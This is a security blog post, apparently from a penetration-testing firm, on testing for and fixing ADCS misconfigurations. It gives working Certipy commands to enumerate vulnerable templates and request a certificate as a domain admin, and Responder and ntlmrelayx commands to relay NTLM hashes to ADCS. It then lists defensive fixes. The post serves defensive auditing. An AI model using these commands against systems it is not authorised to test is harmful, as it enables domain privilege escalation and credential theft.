---
image: "~/assets/images/adcs.webp"
title: How To Fix ADCS Vulnerabilities
excerpt: "ADCS attacks can make any pentester (or attacker) salivate. Lets talk about how to find and fix them."
author: Staff
tags:
 - penetration testing
publishDate: 2024-09-05T00:00:00Z
---


### Fixing Active Directory Certificate Services (ADCS) Attacks

We see the inside of _a lot_ of corporate networks. When we are gearing up to perform Internal Penetration Testing, one of the first things we look for (after we got our hands on a user account), is vulnerabilities in **Active Directory Certificate Services (ADCS)**. ADCS, which manages digital certificates, often contains misconfigurations that attackers can easily exploit to elevate privileges within the domain. At **Strategic Defense**, we frequently discover and exploit ADCS misconfigurations during internal penetration tests using tools like **Certipy** to demonstrate how attackers can take control of an environment.

#### Common ADCS Misconfigurations

Before diving into how to test your environment, it’s important to understand the most common ADCS misconfigurations that we exploit:
- **Overly Permissive Certificate Templates:** Low-privileged users can request certificates with high-privileged access.
- **Vulnerable Certificate Authority Permissions:** Weak permissions on certificate authorities (CAs) allow certificate forgery.
- **NTLM Relaying to ADCS:** If the CA allows NTLM authentication, attackers can relay NTLM hashes to request certificates on behalf of domain users.

You can see all the possible domain escalations [here](https://github.com/ly4k/Certipy/blob/main/README.md#domain-escalation).

#### How to Test for ADCS Misconfigurations

To check your environment for ADCS misconfigurations, we recommend using [Certipy](https://github.com/ly4k/Certipy) if you're comfy with Linux and Python, or [Certify](https://github.com/GhostPack/Certify) on Windows. For these examples, we will be showcasing Certipy. Certipy automates many common ADCS attacks, making it a one-stop-shop for internal ADCS testing.

##### 1. Install Certipy

First, you’ll need to install **Certipy**. You can clone the GitHub repo and set it up in your environment using:

```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install -r requirements.txt
```

Alternatively, you can install it via **pip**:

```bash
pip install certipy-ad
```

##### 2. Enumerate Certificate Templates

To enumerate all the certificate templates in your environment, use the following Certipy command:

```bash
certipy find -u <username> -p <password> -d <domain> -dc-ip <domain-controller-ip>
```

This command will list all templates and identify misconfigurations, such as **ESC1**, which allows low-privileged users to request high-privileged certificates. It's a good idea to try this using a low-privlileged account, or one thats a member of large groups ("Domain Users" for example) - as this casts the widest net for exploitation. Output might look like:

```
[+] Vulnerable certificate template found: "User" (Enrollment rights: Domain Users)
[+] ESC1: Low-privileged user can enroll in high-privilege templates
```

##### 3. Request a Certificate as Another User

Once you’ve identified vulnerable templates, you can exploit them by requesting a certificate as another user. In this example, we’ll use a template that allows us to impersonate a domain administrator:

```bash
certipy req -u <username> -p <password> -d <domain> -dc-ip <domain-controller-ip> -template <template-name> -upn <admin@domain.local>
```

This command will create a certificate for the domain admin account, which can then be used to authenticate and escalate privileges.

##### 4. Perform an NTLM Relay Attack to ADCS

Another common attack we see is NTLM relaying to ADCS. If relaying is possible, attackers can authenticate to the ADCS server and request certificates (among other nefarious things). To test this:

Set up **Responder** to capture NTLM hashes:
```bash
sudo responder -I <interface>
```

Use **ntlmrelayx** to relay these hashes to ADCS:

```bash
ntlmrelayx.py -t http://<adcs-server>/certsrv/certfnsh.asp -smb2support
```

If successful, the attacker will receive a valid certificate that can be used to authenticate as the captured user.

You can also skip Responder and Ntlmrelayx, and just use nmap to see if any hosts in your environment might allowe relaying, like so:

```bash
nmap -p 445 --script smb2-security-mode <target> 
```
#### Additional Ways to Test
There are additional tools you can use to check your environment:
 
 - [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) is a PowerShell toolkit for auditing ADCS. 
 - [Bloodhound](https://github.com/SpecterOps/BloodHound) has been updated to take results from Certipy for checking ADCS misconfigurations.
 - [Locksmith](https://github.com/TrimarcJake/Locksmith) can find (and fix) ADCS issues.

#### Defensive Measures

Fixing these misconfigurations is essential to prevent exploitation. Here are some defensive steps:

1. **Restrict Certificate Template Access:**
   Ensure only authorized users or groups can enroll in high-privileged templates. You can check template permissions using PowerShell:

   ```powershell
   Get-CATemplate | ForEach-Object {
       $_.DisplayName
       Get-ACL -InputObject $_.CertificateTemplate -AccessRights All
   }
   ```

2. **Disable NTLM Authentication:**
   Disable NTLM on your ADCS servers to prevent NTLM relay attacks. You can enforce Kerberos authentication by updating your CA’s security policies and settings.

3. **Monitor and Audit ADCS Activity:**
   Regularly monitor certificate requests and issuance by enabling auditing:

   ```powershell
   auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
   ```

4. **Update Outdated CA Servers:**
   Ensure that your CA servers are up to date with the latest patches and that only necessary features are enabled.

#### Conclusion

At **Strategic Defense**, we frequently leverage ADCS misconfigurations during internal penetration tests, using tools like **Certipy** to demonstrate how attackers can escalate privileges through certificate-based attacks. We arent the only ones; real-world threat actors use the same tools to take advantage of the same issues. Testing your environment for ADCS vulnerabilities is essential to securing your Active Directory infrastructure. By identifying and fixing these issues, you can prevent attackers from exploiting one of the most overlooked attack vectors.

If you want to learn more about securing your AD environment or need help assessing your infrastructure, feel free to [contact us](/contact). We’re here to help.

